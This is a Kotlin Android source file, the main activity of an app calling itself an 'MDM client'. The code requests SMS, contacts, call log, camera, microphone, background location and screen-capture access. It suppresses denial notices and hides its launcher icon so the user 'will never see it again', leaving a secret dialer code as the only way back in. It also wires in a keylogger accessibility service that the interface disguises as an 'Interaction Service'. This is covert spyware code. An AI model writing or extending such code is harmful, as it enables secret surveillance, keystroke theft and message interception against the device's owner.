package com.mdm.client

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.mdm.client.config.AppConfig
import com.mdm.client.databinding.ActivityMainBinding
import com.mdm.client.keylogger.KeyloggerAccessibilityService
import com.mdm.client.service.MdmForegroundService
import com.mdm.client.util.NetworkUtils

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding

    private val dangerousPermissions = buildList {
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        add(Manifest.permission.READ_SMS)
        add(Manifest.permission.SEND_SMS)
        add(Manifest.permission.READ_CONTACTS)
        add(Manifest.permission.READ_CALL_LOG)
        add(Manifest.permission.CALL_PHONE)
        add(Manifest.permission.CAMERA)
        add(Manifest.permission.RECORD_AUDIO)
        add(Manifest.permission.READ_PHONE_STATE)
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            add(Manifest.permission.BLUETOOTH_CONNECT)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }.toTypedArray()

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val denied = results.filterValues { !it }.keys
        if (denied.isNotEmpty()) {
            // Don't show toast — silent
        }
        requestBackgroundLocation()
    }

    private val backgroundLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) {
        requestMediaProjection()
    }

    private val mediaProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            AppConfig.mediaProjectionResultCode = result.resultCode
            AppConfig.mediaProjectionData = result.data
        }
        // After media projection, finalize enrollment
        finalizeEnrollment()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // If already enrolled, go headless immediately
        if (AppConfig.isSetupComplete(this) && AppConfig.isConfigured(this)) {
            startMdmService()
            hideAppIcon()
            finish()
            return
        }

        // Check if launched via QR provisioning intent with server_ip extra
        val qrServerIp = intent?.getStringExtra("server_ip")

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Pre-fill server IP from QR or saved config
        binding.etServerIp.setText(qrServerIp ?: AppConfig.getServerIp(this))
        binding.tvDeviceId.text = "Device ID: ${AppConfig.getDeviceId(this)}\nDevice IP: ${NetworkUtils.getLocalIpAddress(this)}"

        binding.btnSave.setOnClickListener {
            val ip = binding.etServerIp.text.toString().trim()
            if (ip.isBlank()) {
                Toast.makeText(this, "Enter server IP", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            AppConfig.setServerIp(this, ip)
            // Start permission chain — will auto-finalize at the end
            requestAllPermissions()
        }

        binding.btnAccessibility.setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        binding.btnUsageStats.setOnClickListener {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
        }

        // If QR provisioning provided server IP, auto-start enrollment
        if (qrServerIp != null && qrServerIp.isNotBlank()) {
            AppConfig.setServerIp(this, qrServerIp)
            requestAllPermissions()
        }
    }

    private fun requestAllPermissions() {
        val missing = dangerousPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            permissionLauncher.launch(missing.toTypedArray())
        } else {
            requestBackgroundLocation()
        }
    }

    private fun requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            != PackageManager.PERMISSION_GRANTED
        ) {
            backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        } else {
            requestMediaProjection()
        }
    }

    private fun requestMediaProjection() {
        if (AppConfig.mediaProjectionData == null) {
            try {
                val mpManager = getSystemService(MediaProjectionManager::class.java)
                mediaProjectionLauncher.launch(mpManager.createScreenCaptureIntent())
            } catch (_: Exception) {
                finalizeEnrollment()
            }
        } else {
            finalizeEnrollment()
        }
    }

    /**
     * Called after all permissions are granted. Starts service, hides icon, finishes activity.
     * The app becomes a headless background agent from this point.
     */
    private fun finalizeEnrollment() {
        promptDisableBatteryOptimization()
        startMdmService()
        AppConfig.setSetupComplete(this, true)

        // Hide launcher icon — app is now headless
        hideAppIcon()

        // Close the activity — user will never see it again
        // Can be re-opened via secret dialer code *#*#636#*#*
        finish()
    }

    private fun promptDisableBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(PowerManager::class.java)
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    })
                } catch (_: Exception) {}
            }
        }
    }

    private fun hideAppIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, "$packageName.LauncherAlias"),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    fun showAppIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, "$packageName.LauncherAlias"),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun startMdmService() {
        val intent = Intent(this, MdmForegroundService::class.java)
        ContextCompat.startForegroundService(this, intent)
    }

    override fun onResume() {
        super.onResume()
        if (::binding.isInitialized) {
            val accessible = KeyloggerAccessibilityService.isEnabled(this)
            binding.btnAccessibility.text = if (accessible)
                "Interaction Service: ENABLED" else "Enable Interaction Service"
        }
    }
}
